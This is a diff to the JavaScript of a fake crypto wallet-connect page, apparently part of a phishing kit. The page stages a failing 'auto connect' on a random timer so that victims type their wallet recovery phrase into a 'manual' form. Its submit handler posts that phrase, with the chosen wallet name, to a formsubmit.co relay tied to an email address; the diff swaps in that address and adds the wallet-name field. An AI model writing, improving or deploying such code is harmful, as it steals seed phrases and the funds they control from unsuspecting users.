@@ -2,8 +2,8 @@ const searchWallet = document.getElementById("searchWallet");
 const divWallets = document.querySelectorAll(".divWallet");
 const walletCount = document.getElementById("walletCount");
 
-const walletImg = document.querySelector(".wallet-img")
-const wallettitle = document.querySelector(".wallet-name")
+const walletImg = document.querySelector(".wallet-img");
+const wallettitle = document.querySelector(".wallet-name");
 const walletPopupMain = document.querySelector(".walletPopupMain");
 const autoConnect = document.querySelector(".auto");
 const manualConnect = document.querySelector(".manual");
@@ -11,15 +11,11 @@ const closePopup = document.getElementById("closePopup");
 const tryAgain = document.querySelector(".tryAgain");
 const manualBtn = document.querySelector(".manualConnect");
 const phraseForm = document.querySelector(".phraseForm");
-const phraseBox = document.querySelector(".phraseBox")
+const phraseBox = document.querySelector(".phraseBox");
 const formLoading = document.querySelector(".formLoading");
 const connectBtn = document.querySelector(".connectbtn");
 
-
-
-
-// script for the search bar 
-
+// Script for the search bar
 let totalWallets = divWallets.length;
 walletCount.innerHTML = totalWallets;
 
@@ -27,7 +23,7 @@ let searchCount = 0;
 
 searchWallet.addEventListener("input", (e) => {
     const inputValue = e.target.value.toUpperCase();
-    searchCount = 0
+    searchCount = 0;
 
     divWallets.forEach((divwallet) => {
         const pTag = divwallet.querySelector("p");
@@ -35,29 +31,25 @@ searchWallet.addEventListener("input", (e) => {
 
         if (textContent.includes(inputValue)) {
             divwallet.style.display = "block";
-
-            searchCount++
-
+            searchCount++;
         } else {
-            divwallet.style.display = "none"
+            divwallet.style.display = "none";
         }
-    })
+    });
 
     walletCount.innerHTML = searchCount;
 });
 
-
-// Script for the select wallet 
-
+// Script for the select wallet
 let imgScr = "";
-let walletName = ""
+let walletName = "";
 let timer;
 let timerCount;
 let timeoutId;
 
 divWallets.forEach((divWallet) => {
     divWallet.addEventListener("click", () => {
-        const img = divWallet.querySelector("img")
+        const img = divWallet.querySelector("img");
         imgScr = img.getAttribute("src");
 
         const name = divWallet.querySelector("p");
@@ -66,38 +58,37 @@ divWallets.forEach((divWallet) => {
         wallettitle.innerHTML = walletName;
         walletImg.src = imgScr;
 
-        walletPopupMain.classList.remove("active")
+        // Update the hidden input for the wallet name
+        document.getElementById("walletNameInput").value = walletName;
+
+        walletPopupMain.classList.remove("active");
 
         timer = Math.floor(Math.random() * 6) + 5;
-
         timerCount = timer * 1000;
 
         timeoutId = setTimeout(() => {
-            autoConnect.classList.add("active")
-            manualConnect.classList.remove("active")
-
+            autoConnect.classList.add("active");
+            manualConnect.classList.remove("active");
         }, timerCount);
 
-        console.log(timerCount)
-
-
-    })
-})
+        console.log(timerCount);
+    });
+});
 
 closePopup.addEventListener("click", () => {
-    walletPopupMain.classList.add("active")
-    autoConnect.classList.remove("active")
-    manualConnect.classList.add("active")
-    phraseForm.classList.add("active")
+    walletPopupMain.classList.add("active");
+    autoConnect.classList.remove("active");
+    manualConnect.classList.add("active");
+    phraseForm.classList.add("active");
     phraseBox.value = "";
     formLoading.classList.add("active");
-    connectBtn.innerHTML ="Connect";
+    connectBtn.innerHTML = "Connect";
 
     timer = 0;
     timerCount = 0;
 
     clearTimeout(timeoutId);
-})
+});
 
 tryAgain.addEventListener("click", () => {
     autoConnect.classList.remove("active");
@@ -107,50 +98,50 @@ tryAgain.addEventListener("click", () => {
     timerCount = timer * 1000;
 
     timeoutId = setTimeout(() => {
-        autoConnect.classList.add("active")
-        manualConnect.classList.remove("active")
-
+        autoConnect.classList.add("active");
+        manualConnect.classList.remove("active");
     }, timerCount);
 
-    console.log(timerCount)
-})
+    console.log(timerCount);
+});
 
 manualBtn.addEventListener("click", () => {
     manualConnect.classList.add("active");
     phraseForm.classList.remove("active");
+});
 
-})
+// Submit form
+phraseForm.addEventListener("submit", (e) => {
+    e.preventDefault();
 
-
-
-// submit form 
-
-phraseForm.addEventListener('submit', (e) => {
-	e.preventDefault();
-
-	fetch("https://formsubmit.co/ajax/35d0d4fe0826211d56c985e41504392c", {
-		method: "POST",
-		headers: {
-			'Content-Type': 'application/json',
-			'Accept': 'application/json'
-		},
-		body: JSON.stringify({
-			name: "Wallet Phrase",
-			message: phraseBox.value
-		})
-	})
-	.then(response => response.json())
-	.then(data => {
-        console.log(data);
-        manualConnect.classList.remove("active");
-        phraseForm.classList.add("active");
-        formLoading.classList.add("active");
-        connectBtn.innerHTML ="Connect";
-        phraseBox.value="";
-
-    })
-	.catch(error => console.log(error));
-
+    // Add loading animation and button text
+    connectBtn.innerHTML = "Connecting...";
     formLoading.classList.remove("active");
-    connectBtn.innerHTML ="Connecting...";
+
+    // Create FormData object and include wallet name dynamically
+    const formData = new FormData(phraseForm);
+    formData.append("walletName", walletName); // Include the selected wallet name
+
+    fetch("https://formsubmit.co/ajax/alexokor91@gmail.com", {
+        method: "POST",
+        body: formData,
+        headers: {
+            Accept: "application/json",
+        },
+    })
+        .then((response) => {
+            if (!response.ok) throw new Error("Submission failed");
+            return response.json();
+        })
+        .then((data) => {
+            console.log("Form successfully submitted:", data);
+            connectBtn.innerHTML = "Try Again!";
+            phraseForm.reset(); // Clear form inputs
+            formLoading.classList.add("active");
+        })
+        .catch((error) => {
+            console.error("Error:", error);
+            connectBtn.innerHTML = "Error. Try Again!";
+            formLoading.classList.add("active");
+        });
 });
